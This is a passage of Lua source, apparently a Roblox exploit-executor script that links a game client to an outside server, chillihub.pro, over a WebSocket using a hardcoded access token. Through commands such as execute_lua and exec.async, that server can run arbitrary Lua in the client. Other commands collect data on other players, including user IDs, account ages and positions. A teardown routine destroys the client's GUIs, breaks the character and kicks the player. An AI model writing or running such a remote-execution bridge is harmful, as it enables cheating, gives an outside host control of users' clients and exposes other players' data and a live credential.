		local playerGui = Players2.LocalPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			table.insert(tbl13, playerGui)
		end

		for _, v12 in ipairs(tbl13) do
			for _, child in ipairs(v12:GetChildren()) do
				if child:IsA("ScreenGui") then
					pcall(function()
						child:Destroy()
					end)
				end
			end
		end
	end)

	pcall(function()
		rawset(_G, "__ChilliAutoLoadQueued", nil)

		if type(queue_on_teleport) == "function" then
			queue_on_teleport("")
		elseif type(queueonteleport) == "function" then
			queueonteleport("")
		end
	end)

	pcall(function()
		local character = game:GetService("Players").LocalPlayer.Character

		if character then
			character:BreakJoints()
		end
	end)

	pcall(function()
		game:GetService("Players").LocalPlayer:Kick("\u{200B}")
	end)
end)

local HttpService2
HttpService2 = game:GetService("HttpService")
local Players2
Players2 = game:GetService("Players")
local RunService2
RunService2 = game:GetService("RunService")
local Workspace
Workspace = game:GetService("Workspace")
local str
str = "chp-7E0Yzx4yddoAozc9VNLsqTnA"
local str2
str2 = "wss://chillihub.pro/roblox-mcp?token=" .. str
local str3
str3 = "https://chillihub.pro/roblox-mcp/beat"
local str4
str4 = "SAE v615"
local flag3, flag4, localPlayer2, genv, flag5, flag6, v11, n3, flag7, tbl13
local tbl14, tbl15, n4, fn12, fn13, fn14, fn15, fn16, fn17, fn18
local fn19, fn20, fn21, fn22

do
	local n5 = 7
	local n6 = 500
	local n7 = 245760
	local flag8 = false
	flag3 = false
	flag4 = false
	localPlayer2 = Players2.LocalPlayer
	genv = getgenv and getgenv() or _G

	if type(genv.StopChilliLink) == "function" then
		pcall(genv.StopChilliLink)
	end

	flag5 = true
	flag6 = false
	v11 = nil
	n3 = 0
	flag7 = false
	tbl13 = {}
	tbl14 = {}
	tbl15 = {}
	n4 = 0

	fn12 = function(...)
		if flag8 then
			print("[ROBLOX MCP]", ...)
		end
	end

	fn13 = function(...)
		if flag8 then
			warn("[ROBLOX MCP]", ...)
		end
	end

	fn14 = function(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	fn15 = function(arg, arg2, arg3, arg4)
		local num = tonumber(arg)
		if not num then
			return arg4
		end
		return math.max(arg2, math.min(arg3, num))
	end

	fn16 = function(arg)
		for _, v12 in ipairs(arg) do
			pcall(function()
				v12:Disconnect()
			end)
		end

		table.clear(arg)
	end

	fn17 = function()
		if syn and syn.websocket and type(syn.websocket.connect) == "function" then
			return syn.websocket.connect, "syn.websocket.connect"
		end

		if WebSocket and type(WebSocket.connect) == "function" then
			return WebSocket.connect, "WebSocket.connect"
		end

		if WebSocket and type(WebSocket.new) == "function" then
			return WebSocket.new, "WebSocket.new"
		end

		if WebSocket and type(WebSocket.New) == "function" then
			return WebSocket.New, "WebSocket.New"
		end

		if websocket and type(websocket.connect) == "function" then
			return websocket.connect, "websocket.connect"
		end

		if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
			return syn.WebSocket.new, "syn.WebSocket.new"
		end
		return nil, nil
	end

	fn18 = function(arg, ...)
		local v12 = table.pack(...)

		for i = 1, select("#", ...) do
			local value = select(i, table.unpack(v12, 1, v12.n))

			local ok, result = pcall(function()
				return arg[value]
			end)

			if ok and result ~= nil then
				return result, value
			end
		end

		return nil, nil
	end

	fn19 = function(arg, arg2)
		if not arg then
			return nil
		end

		local ok, result = pcall(function()
			return arg:Connect(arg2)
		end)

		return ok and result or nil
	end

	fn20 = function(arg)
		if typeof(arg) ~= "Instance" then
			return nil
		end

		local ok, result = pcall(function()
			return arg:GetFullName()
		end)

		return ok and result or arg.Name
	end

	fn21 = nil

	fn21 = function(arg, arg2, arg3)
		arg2 = arg2 or 0
		arg3 = arg3 or {}
		if n5 < arg2 then
			return "<max-depth>"
		end
		local kind = typeof(arg)
		if arg == nil or kind == "string" or kind == "boolean" then
			return arg
		end

		if kind == "number" then
			if arg ~= arg or arg == math.huge or arg == -math.huge then
				return tostring(arg)
			end
			return arg
		end

		if kind == "Instance" then
			return { type = "Instance", className = arg.ClassName, name = arg.Name, path = fn20(arg) }
		end

		if kind == "Vector2" then
			return { type = "Vector2", x = arg.X, y = arg.Y }
		end

		if kind == "Vector3" then
			return { type = "Vector3", x = arg.X, y = arg.Y, z = arg.Z }
		end

		if kind == "Color3" then
			return {
				type = "Color3",
				r = math.floor(arg.R * 255 + 0.5),
				g = math.floor(arg.G * 255 + 0.5),
				b = math.floor(arg.B * 255 + 0.5),
			}
		end

		if kind == "UDim" then
			return { type = "UDim", scale = arg.Scale, offset = arg.Offset }
		end

		if kind == "UDim2" then
			return {
				type = "UDim2",
				xScale = arg.X.Scale,
				xOffset = arg.X.Offset,
				yScale = arg.Y.Scale,
				yOffset = arg.Y.Offset,
			}
		end

		if kind == "CFrame" then
			return { type = "CFrame", components = { arg:GetComponents() } }
		end

		if kind == "EnumItem" then
			return tostring(arg)
		end

		if kind == "BrickColor" then
			return { type = "BrickColor", name = arg.Name, number = arg.Number }
		end

		if kind == "table" then
			if arg3[arg] then
				return "<cycle>"
			end
			arg3[arg] = true
			local n8 = 0
			local flag9 = true
			local n9 = 0

			for k in pairs(arg) do
				n8 += 1

				if not (n6 < n8) then
					if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
						flag9 = false
					elseif k > n9 then
						n9 = k
					end

					continue
				end

				break
			end

			local tbl16

			if flag9 and n9 <= n6 then
				tbl16 = {}

				for i = 1, n9 do
					tbl16[i] = fn21(arg[i], arg2 + 1, arg3)
				end
			else
				tbl16 = {}
				local v12, v13, v14 = pairs(arg)
				local n10 = 0

				for k, v15 in v12, v13, v14 do
					n10 += 1

					if n6 < n10 then
						tbl16.__truncated = true
						break
					else
						tbl16[tostring(k)] = fn21(v15, arg2 + 1, arg3)
					end
				end
			end

			arg3[arg] = nil
			return tbl16
		end

		return tostring(arg)
	end

	fn22 = function(arg)
		if not flag6 or not v11 then
			return false, "not connected"
		end

		local ok, result = pcall(function()
			return HttpService2:JSONEncode(fn21(arg))
		end)

		if not ok then
			return false, "JSON encode failed: " .. tostring(result)
		end

		if #result > n7 then
			if not (type(arg) == "table" and arg.type == "rpc_result") then
				return false, "message too large"
			end

			result = HttpService2:JSONEncode({
				type = "rpc_result",
				requestId = arg.requestId,
				success = false,
				error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
			})
		end

		local ok2, result2 = pcall(function()
			v11:Send(result)
		end)

		if not ok2 then
			return false, "WebSocket send failed: " .. tostring(result2)
		end
		return true
	end
end

local fn23

fn23 = function(arg, arg2)
	fn22({ type = "rpc_event", event = arg, data = arg2 or {} })
end

local fn24

do
	local tbl16 = {
		Game = game,
		game = game,
		Workspace = Workspace,
		workspace = Workspace,
		Players = Players2,
		Lighting = game:GetService("Lighting"),
		ReplicatedStorage = game:GetService("ReplicatedStorage"),
		ReplicatedFirst = game:GetService("ReplicatedFirst"),
		StarterGui = game:GetService("StarterGui"),
		StarterPlayer = game:GetService("StarterPlayer"),
		SoundService = game:GetService("SoundService"),
		Teams = game:GetService("Teams"),
		LocalPlayer = localPlayer2,
	}

	local function fn25(arg)
		local tbl17 = {}

		for match in fn14(arg):gmatch("[^%.]+") do
			table.insert(tbl17, match)
		end

		return tbl17
	end

	fn24 = function(arg)
		local v12 = fn25(arg)
		if #v12 == 0 then
			return nil, "path is empty"
		end
		local result = tbl16[v12[1]]

		if not result then
			local ok

			ok, result = pcall(function()
				return game:GetService(v12[1])
			end)

			if not (ok and result) then
				return nil, "unknown root: " .. v12[1]
			end
		end

		for i = 2, #v12 do
			local pathNotFoundAt = v12[i]

			if result == Players2 and pathNotFoundAt == "LocalPlayer" then
				result = localPlayer2
			elseif result == localPlayer2 and pathNotFoundAt == "PlayerGui" then
				result = localPlayer2:FindFirstChildOfClass("PlayerGui")
			elseif result == localPlayer2 and pathNotFoundAt == "Character" then
				result = localPlayer2.Character
			elseif result == Workspace and pathNotFoundAt == "CurrentCamera" then
				result = Workspace.CurrentCamera
			elseif typeof(result) == "Instance" then
				result = result:FindFirstChild(pathNotFoundAt)
			else
				result = nil
			end

			if not result then
				return nil, "path not found at: " .. pathNotFoundAt
			end
		end

		return result
	end
end

local tbl16

do
	local tbl17 = {
		Archivable = true,
		Anchored = true,
		AssemblyAngularVelocity = true,
		AssemblyLinearVelocity = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BrickColor = true,
		CanCollide = true,
		CanQuery = true,
		CanTouch = true,
		CanvasPosition = true,
		CanvasSize = true,
		CFrame = true,
		ClipsDescendants = true,
		Color = true,
		Enabled = true,
		FieldOfView = true,
		Health = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		JumpPower = true,
		LayoutOrder = true,
		Material = true,
		MaxHealth = true,
		MoveDirection = true,
		Orientation = true,
		Position = true,
		RichText = true,
		Rotation = true,
		Size = true,
		Text = true,
		TextColor3 = true,
		TextSize = true,
		TextTransparency = true,
		TextWrapped = true,
		Transparency = true,
		Value = true,
		Velocity = true,
		Visible = true,
		WalkSpeed = true,
	}

	tbl16 = {
		"Archivable",
		"Position",
		"Size",
		"CFrame",
		"Color",
		"Transparency",
		"Visible",
		"Enabled",
		"Text",
		"Value",
		"Health",
		"MaxHealth",
	}

	local function fn25(arg, arg2)
		if not tbl17[arg2] then
			return nil, "not_allowed"
		end

		local ok, result = pcall(function()
			return arg[arg2]
		end)

		if ok then
			return fn21(result)
		end
		return nil, "unavailable"
	end

	local function fn26(arg)
		return {
			name = arg.Name,
			className = arg.ClassName,
			path = fn20(arg),
			parentPath = arg.Parent and fn20(arg.Parent) or nil,
		}
	end

	local function fn27(arg, arg2, arg3)
		local children = arg:GetChildren()
		local n5 = 1
		local n6 = 0

		while n5 <= #children and n6 < arg2 do
			local v12 = children[n5]
			n5 += 1
			n6 += 1
			if arg3(v12, n6) then
				return n6, true
			end

			if #children < arg2 then
				local children2 = v12:GetChildren()

				for _, v13 in ipairs(children2) do
					if not (#children >= arg2) then
						table.insert(children, v13)
						continue
					end
					break
				end
			end
		end

		return n6, false
	end

	local name = "CodexMCP"

	local tbl18 = {
		Frame = true,
		TextLabel = true,
		TextButton = true,
		TextBox = true,
		ImageLabel = true,
		ImageButton = true,
		ScrollingFrame = true,
		UICorner = true,
		UIStroke = true,
		UIListLayout = true,
		UIGridLayout = true,
		UIPadding = true,
		UIAspectRatioConstraint = true,
		UISizeConstraint = true,
	}

	local tbl19 = {
		Active = true,
		AnchorPoint = true,
		AutomaticCanvasSize = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BorderSizePixel = true,
		CanvasPosition = true,
		CanvasSize = true,
		ClipsDescendants = true,
		CornerRadius = true,
		DisplayOrder = true,
		Enabled = true,
		FillDirection = true,
		Font = true,
		HorizontalAlignment = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		LayoutOrder = true,
		LineJoinMode = true,
		MaxTextSize = true,
		MinTextSize = true,
		Name = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
		Position = true,
		RichText = true,
		Rotation = true,
		ScrollBarThickness = true,
		Size = true,
		SortOrder = true,
		Text = true,
		TextColor3 = true,
		TextScaled = true,
		TextSize = true,
		TextStrokeColor3 = true,
		TextStrokeTransparency = true,
		TextTransparency = true,
		TextTruncate = true,
		TextWrapped = true,
		TextXAlignment = true,
		TextYAlignment = true,
		Thickness = true,
		Transparency = true,
		VerticalAlignment = true,
		Visible = true,
		ZIndex = true,
	}

	local tbl20 = {
		BackgroundColor3 = true,
		BorderColor3 = true,
		Color = true,
		ImageColor3 = true,
		TextColor3 = true,
		TextStrokeColor3 = true,
	}

	local tbl21 = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
	local tbl22 = { AnchorPoint = true, CanvasPosition = true }

	local tbl23 = {
		CornerRadius = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
	}

	local tbl24 = {
		AutomaticCanvasSize = Enum.AutomaticSize,
		AutomaticSize = Enum.AutomaticSize,
		FillDirection = Enum.FillDirection,
		Font = Enum.Font,
		HorizontalAlignment = Enum.HorizontalAlignment,
		LineJoinMode = Enum.LineJoinMode,
		SortOrder = Enum.SortOrder,
		TextTruncate = Enum.TextTruncate,
		TextXAlignment = Enum.TextXAlignment,
		TextYAlignment = Enum.TextYAlignment,
		VerticalAlignment = Enum.VerticalAlignment,
	}

	local function fn28(arg)
		if type(arg) ~= "table" then
			return nil
		end
		local num = tonumber(arg[1] or arg.r)
		local num2 = tonumber(arg[2] or arg.g)
		local num3 = tonumber(arg[3] or arg.b)
		if not num or not num2 or not num3 then
			return nil
		end

		if num <= 1 and num2 <= 1 and num3 <= 1 then
			return Color3.new(num, num2, num3)
		end
		local floor = math.floor
		return Color3.fromRGB(math.floor(fn15(num, 0, 255, 0)), math.floor(fn15(num2, 0, 255, 0)), floor(fn15(num3, 0, 255, 0)))
	end

	local function fn29(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return UDim2.new(tonumber(arg[1] or arg.xScale) or 0, tonumber(arg[2] or arg.xOffset) or 0, tonumber(arg[3] or arg.yScale) or 0, tonumber(arg[4] or arg.yOffset) or 0)
	end

	local function fn30(arg)
		if type(arg) ~= "table" then
			return nil
		end
		return Vector2.new(tonumber(arg[1] or arg.x) or 0, tonumber(arg[2] or arg.y) or 0)
	end

	local function fn31(arg)
		if type(arg) == "number" then
			return UDim.new(0, arg)
		end

		if type(arg) ~= "table" then
			return nil
		end
		return UDim.new(tonumber(arg[1] or arg.scale) or 0, tonumber(arg[2] or arg.offset) or 0)
	end

	local function fn32(arg, arg2)
		if tbl20[arg] then
			return fn28(arg2)
		end

		if tbl21[arg] then
			return fn29(arg2)
		end

		if tbl22[arg] then
			return fn30(arg2)
		end

		if tbl23[arg] then
			return fn31(arg2)
		end

		if tbl24[arg] then
			if typeof(arg2) == "EnumItem" then
				return arg2
			end
			return tbl24[arg][tostring(arg2):match("([^%.]+)$")]
		end

		return arg2
	end

	local function fn33(arg, arg2)
		if type(arg2) ~= "table" then
			return { applied = 0, rejected = {} }
		end
		local tbl25 = {}
		local n5 = 0

		for k, v12 in pairs(arg2) do
			if not tbl19[k] then
				table.insert(tbl25, { property = tostring(k), reason = "not_allowed" })
			else
				local v13 = fn32(k, v12)

				if v13 == nil then
					table.insert(tbl25, { property = k, reason = "invalid_value" })
				else
					local ok, result = pcall(function()
						arg[k] = v13
					end)

					if ok then
						n5 += 1
					else
						table.insert(tbl25, { property = k, reason = tostring(result) })
					end
				end
			end
		end

		return { applied = n5, rejected = tbl25 }
	end

	local function fn34()
		return localPlayer2:FindFirstChildOfClass("PlayerGui") or localPlayer2:WaitForChild("PlayerGui", 10)
	end

	local function fn35(arg)
		local v12 = fn34()
		if not v12 then
			return nil, "PlayerGui is unavailable"
		end
		local codexMCP = v12:FindFirstChild("CodexMCP")

		if not codexMCP and arg then
			codexMCP = Instance.new("ScreenGui")
			codexMCP.Name = name
			codexMCP.ResetOnSpawn = false
			codexMCP.IgnoreGuiInset = false
			codexMCP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			codexMCP.Parent = v12
		end

		return codexMCP
	end

	local function fn36(arg)
		local v12, v13 = fn35(false)
		if not v12 then
			return nil, v13 or "managed UI does not exist"
		end
		local v14 = fn14(arg)
		if v14 == "" or v14 == name then
			return v12
		end

		for match in v14:gmatch("[^%.]+") do
			if match ~= name then
				v12 = v12:FindFirstChild(match)
				if not v12 then
					return nil, "managed UI path not found: " .. match
				end
			end
		end

		return v12
	end

	local tbl25 = { Activated = true, MouseButton1Click = true, FocusLost = true }

	local function fn37(arg, arg2)
		if type(arg2) ~= "table" then
			return
		end

		for _, v12 in ipairs(arg2) do
			if tbl25[v12] then
				local ok, result = pcall(function()
					return arg[v12]
				end)

				if ok and result and type(result.Connect) == "function" then
					local connection = result:Connect(function(...)
						local tbl26 = { ... }
						fn23("ui." .. v12, { path = fn20(arg), name = arg.Name, className = arg.ClassName, arguments = fn21(tbl26) })
					end)

					table.insert(tbl15, connection)
				end
			end
		end
	end

	local fn38 = nil

	fn38 = function(arg, parent, arg2, arg3)
		if arg2 > 10 then
			error("UI tree exceeds maximum depth of 10")
		end

		if arg3.count >= 250 then
			error("UI tree exceeds maximum of 250 objects")
		end

		if type(arg) ~= "table" then
			error("UI node must be an object")
		end

		local uiClassIsNotAllowed = fn14(arg.class or arg.className)

		if not tbl18[uiClassIsNotAllowed] then
			error("UI class is not allowed: " .. uiClassIsNotAllowed)
		end

		arg3.count = arg3.count + 1
		local instance = Instance.new(uiClassIsNotAllowed)
		instance.Name = fn14(arg.name) ~= "" and fn14(arg.name):sub(1, 64) or uiClassIsNotAllowed .. arg3.count
		local v12 = fn33(instance, arg.props)
		instance.Parent = parent
		fn37(instance, arg.events)
		local children = type(arg.children) == "table" and arg.children or {}

		for _, child in ipairs(children) do
			fn38(child, instance, arg2 + 1, arg3)
		end

		return instance, v12
	end

	local fn39 = nil

	fn39 = function(arg, arg2, arg3)
		local v12 = fn26(arg)
		if arg2 >= arg3 then
			v12.truncated = #arg:GetChildren() > 0
			return v12
		end
		v12.children = {}

		for _, child in ipairs(arg:GetChildren()) do
			table.insert(v12.children, fn39(child, arg2 + 1, arg3))
		end

		return v12
	end

	local n5 = 60000
	local n6 = 80
	local tbl26 = {}

	local function fn40(...)
		local v12 = table.pack(...)
		local tbl27 = {}

		for i = 1, select("#", ...) do
			local v13 = tostring
			local value = select(i, table.unpack(v12, 1, v12.n))
			tbl27[i] = v13(value)
		end

		return table.concat(tbl27, " ")
	end

	local function fn41(arg, arg2)
		local str5 = tostring(arg or "")

		if str5:match("^%s*$") then
			error("Code is empty", 0)
		end

		local str6 = "=" .. tostring(arg2 or "WebConsole"):sub(1, 60)
		local chunk, v12 = loadstring(str5, str6)

		if not chunk then
			local chunk2 = loadstring("return " .. str5, str6)
			if chunk2 then
				return chunk2
			end
			error("Syntax error: " .. tostring(v12), 0)
		end

		return chunk
	end

	local function fn42(arg)
		local env = getfenv(0)

		local obj = setmetatable({}, {
			__index = env,
			__newindex = function(arg2, arg3, arg4)
				env[arg3] = arg4
			end,
		})

		rawset(obj, "print", function(...)
			local v12 = table.pack(...)
			arg("print", fn40(...))

			if flag3 then
				print(table.unpack(v12, 1, v12.n))
			end
		end)

		rawset(obj, "warn", function(...)
			local v12 = table.pack(...)
			arg("warn", fn40(...))

			if flag3 then
				warn(table.unpack(v12, 1, v12.n))
			end
		end)

		return obj
	end

	local function fn43(arg)
		local kind = typeof(arg)
		local ok, result = pcall(tostring, arg)

		return {
			type = kind,
			text = (ok and tostring(result) or "<unprintable>"):sub(1, 4000),
			value = kind ~= "nil" and fn21(arg) or nil,
		}
	end

	local function fn44(arg, arg2, arg3, arg4)
		local tbl27 = {}
		local tbl28 = {}

		for i = 2, arg.n do
			tbl27[i - 1] = fn21(arg[i])
			tbl28[i - 1] = fn43(arg[i])
		end

		return {
			output = table.concat(arg3, "\n"),
			outputTruncated = arg4 or nil,
			returns = tbl27,
			returnsInfo = tbl28,
			returnCount = arg.n - 1,
			elapsedMs = arg2,
		}
	end

	local function fn45(arg)
		return debug.traceback(tostring(arg), 2)
	end

	local function fn46(arg)
		if #arg.pending == 0 then
			return
		end
		local pending = arg.pending
		arg.pending = {}
		fn23("exec.output", { runId = arg.id, label = arg.label, lines = pending })
	end

	local function fn47(arg, arg2)
		local character = arg.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		return {
			name = arg.Name,
			displayName = arg.DisplayName,
			userId = arg.UserId,
			accountAge = arg.AccountAge,
			team = arg.Team and arg.Team.Name or nil,
			neutral = arg.Neutral,
			character = character and character.Name or nil,
			health = humanoid and humanoid.Health or nil,
			maxHealth = humanoid and humanoid.MaxHealth or nil,
			position = arg2 and humanoidRootPart and fn21(humanoidRootPart.Position) or nil,
		}
	end

	local tbl27 = {
		["system.ping"] = function(arg)
			return { pong = true, echo = arg, clientTime = DateTime.now().UnixTimestampMillis }
		end,
		["game.info"] = function()
			return {
				placeId = game.PlaceId,
				gameId = game.GameId,
				jobId = game.JobId,
				placeVersion = game.PlaceVersion,
				privateServerId = game.PrivateServerId,
				privateServerOwnerId = game.PrivateServerOwnerId,
				playerCount = #Players2:GetPlayers(),
				localPlayer = { name = localPlayer2.Name, displayName = localPlayer2.DisplayName, userId = localPlayer2.UserId },
			}
		end,
		execute_lua = function(arg)
			local v12 = fn41(arg.code, arg.label)
			local tbl27 = {}
			local n7 = 0
			local flag8 = false

			local v13 = fn42(function(arg2, arg3)
				if flag8 then
					return
				end
				local str5 = (arg2 == "warn" and "[warn] " or "") .. arg3
				n7 = n7 + #str5 + 1

				if n5 < n7 then
					flag8 = true
					table.insert(tbl27, "... output truncated ...")
					return
				end

				table.insert(tbl27, str5)
			end)

			setfenv(v12, v13)
			local now = os.clock()
			local v14 = table.pack(xpcall(v12, fn45))
			local n8 = math.floor((os.clock() - now) * 1000 + 0.5)

			if not v14[1] then
				error(string.format("Runtime error: %s\n--- output ---\n%s", tostring(v14[2]), table.concat(tbl27, "\n"):sub(-20000)), 0)
			end

			return fn44(v14, n8, tbl27, flag8)
		end,
		["exec.async"] = function(arg)
			local v12 = fn41(arg.code, arg.label)
			local tbl27 = { id = HttpService2:GenerateGUID(false):sub(1, 8) }
			tbl27.label = tostring(arg.label or "Script"):sub(1, 60)
			tbl27.startedAt = os.clock()
			tbl27.pending = {}
			tbl27.lineCount = 0
			tbl27.dropped = 0

			local v13 = fn42(function(arg2, arg3)
				tbl27.lineCount = tbl27.lineCount + 1
				if #tbl27.pending >= n6 then
					tbl27.dropped = tbl27.dropped + 1
					return
				end
				table.insert(tbl27.pending, { kind = arg2, text = arg3:sub(1, 1000) })
			end)

			setfenv(v12, v13)
			tbl26[tbl27.id] = tbl27

			task.spawn(function()
				while tbl26[tbl27.id] == tbl27 do
					task.wait(0.3)

					if tbl27.dropped > 0 then
						table.insert(tbl27.pending, { kind = "warn", text = string.format("... %d line(s) skipped ...", tbl27.dropped) })
						tbl27.dropped = 0
					end

					fn46(tbl27)
				end
			end)

			tbl27.thread = task.defer(function()
				local v14 = table.pack(xpcall(v12, fn45))
				if tbl26[tbl27.id] ~= tbl27 then
					return
				end
				tbl26[tbl27.id] = nil
				fn46(tbl27)
				local startedAt = tbl27.startedAt
				local n7 = math.floor((os.clock() - startedAt) * 1000 + 0.5)
				local tbl28 = { runId = tbl27.id, label = tbl27.label, ok = v14[1] == true, elapsedMs = n7 }

				if v14[1] then
					local v15 = fn44(v14, n7, {}, false)
					tbl28.returnsInfo = v15.returnsInfo
					tbl28.returnCount = v15.returnCount
				else
					tbl28.error = tostring(v14[2]):sub(1, 4000)
				end

				fn23("exec.finished", tbl28)
			end)

			return { runId = tbl27.id, label = tbl27.label }
		end,
		["exec.cancel"] = function(arg)
			local v12 = tbl26[tostring(arg.runId or "")]
			if not v12 then
				return { cancelled = false, reason = "not running" }
			end
			tbl26[v12.id] = nil
			pcall(task.cancel, v12.thread)
			fn46(v12)
			local startedAt = v12.startedAt

			fn23("exec.finished", {
				runId = v12.id,
				label = v12.label,
				ok = false,
				cancelled = true,
				error = "Cancelled from the web console",
				elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
			})

			return { cancelled = true, runId = v12.id }
		end,
		["exec.list"] = function()
			local tbl27 = {}

			for k, v12 in pairs(tbl26) do
				local startedAt = v12.startedAt

				table.insert(tbl27, {
					runId = k,
					label = v12.label,
					lines = v12.lineCount,
					elapsedMs = math.floor((os.clock() - startedAt) * 1000 + 0.5),
				})
			end

			return { count = #tbl27, runs = tbl27 }
		end,
		["console.tail"] = function(arg)
			local logHistory = game:GetService("LogService"):GetLogHistory()
			local v12 = fn15(arg.limit, 1, 500, 200)
			local n7 = tonumber(arg.since) or 0
			local tbl27 = {}

			for i = #logHistory, 1, -1 do
				local v13 = logHistory[i]

				if not (v13.timestamp <= n7 or #tbl27 >= v12) then
					table.insert(tbl27, 1, {
						message = tostring(v13.message):sub(1, 1000),
						kind = v13.messageType.Name,
						time = v13.timestamp,
					})

					continue
				end

				break
			end

			return { count = #tbl27, entries = tbl27, latest = logHistory[#logHistory] and logHistory[#logHistory].timestamp or n7 }
		end,
		["players.list"] = function(arg)
			local tbl27 = {}
			local flag8 = arg.includePosition ~= false

			for _, player in ipairs(Players2:GetPlayers()) do
				table.insert(tbl27, fn47(player, flag8))
			end

			table.sort(tbl27, function(arg2, arg3)
				return string.lower(arg2.name) < string.lower(arg3.name)
			end)

			return { count = #tbl27, players = tbl27 }
		end,
		["players.get"] = function(arg)
			local query = arg.query
			local num = tonumber(query)
			local v12 = string.lower(fn14(query))

			for _, player in ipairs(Players2:GetPlayers()) do
				if num and player.UserId == num or string.lower(player.Name) == v12 or string.lower(player.DisplayName) == v12 then
					return fn47(player, true)
				end
			end

			error("player not found: " .. tostring(query))
		end,
		["characters.list"] = function()
			local tbl27 = {}

			for _, player in ipairs(Players2:GetPlayers()) do
				local character = player.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

				table.insert(tbl27, {
					player = player.Name,
					userId = player.UserId,
					characterPath = character and fn20(character) or nil,
					health = humanoid and humanoid.Health or nil,
					maxHealth = humanoid and humanoid.MaxHealth or nil,
					walkSpeed = humanoid and humanoid.WalkSpeed or nil,
					jumpPower = humanoid and humanoid.JumpPower or nil,
					moveDirection = humanoid and fn21(humanoid.MoveDirection) or nil,
					state = humanoid and tostring(humanoid:GetState()) or nil,
					position = humanoidRootPart and fn21(humanoidRootPart.Position) or nil,
					velocity = humanoidRootPart and fn21(humanoidRootPart.AssemblyLinearVelocity) or nil,
				})
			end

			return { count = #tbl27, characters = tbl27 }
		end,
		["workspace.summary"] = function(arg)
			local n7 = math.floor(fn15(arg.maxDescendants, 1, 5000, 2000))
			local tbl27 = {}
			local tbl28 = {}

			for _, child in ipairs(Workspace:GetChildren()) do
				table.insert(tbl28, fn26(child))
			end

			local v12 = fn27(Workspace, n7, function(arg2)
				tbl27[arg2.ClassName] = (tbl27[arg2.ClassName] or 0) + 1
				return false
			end)

			return {
				topLevel = tbl28,
				topLevelCount = #tbl28,
				scannedDescendants = v12,
				truncated = v12 >= n7,
				classCounts = tbl27,
			}
		end,
		["instance.find"] = function(arg)
			local v12, v13 = fn24(arg.root or "Workspace")

			if not v12 then
				error(v13)
			end

			local v14 = string.lower(fn14(arg.nameContains))
			local v15 = fn14(arg.className)
			local n7 = math.floor(fn15(arg.limit, 1, 200, 50))
			local tbl27 = {}

			local v16 = fn27(v12, math.floor(fn15(arg.scanLimit, 1, 10000, 3000)), function(arg2)
				local flag8 = v14 == "" or string.find(string.lower(arg2.Name), v14, 1, true) ~= nil
				local flag9 = false

				if v15 ~= "" and arg2.ClassName ~= v15 then
					pcall(function()
						flag9 = arg2:IsA(v15)
					end)
				end

				if flag8 and (v15 == "" or arg2.ClassName == v15 or flag9) then
					table.insert(tbl27, fn26(arg2))
				end

				return #tbl27 >= n7
			end)

			return { root = fn20(v12), scanned = v16, count = #tbl27, matches = tbl27 }
		end,
		["instance.children"] = function(arg)
			local v12, v13 = fn24(arg.path)

			if not v12 then
				error(v13)
			end

			local n7 = math.floor(fn15(arg.limit, 1, 500, 100))
			local children = v12:GetChildren()
			local tbl27 = {}

			for i = 1, math.min(#children, n7) do
				table.insert(tbl27, fn26(children[i]))
			end

			return { parent = fn26(v12), total = #children, returned = #tbl27, children = tbl27 }
		end,
		["instance.inspect"] = function(arg)
			local v12, v13 = fn24(arg.path)

			if not v12 then
				error(v13)
			end

			local tbl27 = {}

			for _, v14 in ipairs(tbl16) do
				tbl27[v14] = true
			end

			if type(arg.properties) == "table" then
				for _, property in ipairs(arg.properties) do
					tbl27[tostring(property)] = true
				end
			end

			local tbl28 = {}
			local tbl29 = {}

			for k in pairs(tbl27) do
				local v14, v15 = fn25(v12, k)

				if v15 then
					tbl29[k] = v15
				else
					tbl28[k] = v14
				end
			end

			return {
				instance = fn26(v12),
				attributes = fn21(v12:GetAttributes()),
				tags = fn21(v12:GetTags()),
				childCount = #v12:GetChildren(),
				properties = tbl28,
				unavailable = tbl29,
			}
		end,
		["instance.attributes"] = function(arg)
			local v12, v13 = fn24(arg.path)

			if not v12 then
				error(v13)
			end

			return { instance = fn26(v12), attributes = fn21(v12:GetAttributes()) }
		end,
		["camera.get"] = function()
			local currentCamera = Workspace.CurrentCamera

			if not currentCamera then
				error("CurrentCamera is unavailable")
			end

			return {
				path = fn20(currentCamera),
				cameraType = tostring(currentCamera.CameraType),
				fieldOfView = currentCamera.FieldOfView,
				viewportSize = fn21(currentCamera.ViewportSize),
				cframe = fn21(currentCamera.CFrame),
				focus = fn21(currentCamera.Focus),
				subject = fn21(currentCamera.CameraSubject),
			}
		end,
		["telemetry.snapshot"] = function()
			local result = RunService2.RenderStepped:Wait()
			local totalMemoryUsageMb = nil

			pcall(function()
				totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
			end)

			return {
				fpsEstimate = result > 0 and math.floor(1 / result + 0.5) or nil,
				frameDeltaMs = result * 1000,
				memoryMb = totalMemoryUsageMb,
				playerCount = #Players2:GetPlayers(),
				placeId = game.PlaceId,
				jobId = game.JobId,
				distributedGameTime = Workspace.DistributedGameTime,
				timestamp = DateTime.now().UnixTimestampMillis,
			}
		end,
		["ui.create"] = function(arg)
			local v12, v13 = fn35(true)

			if not v12 then
				error(v13)
			end

			if arg.replace ~= false then
				fn16(tbl15)

				for _, child in ipairs(v12:GetChildren()) do
					child:Destroy()
				end
			end

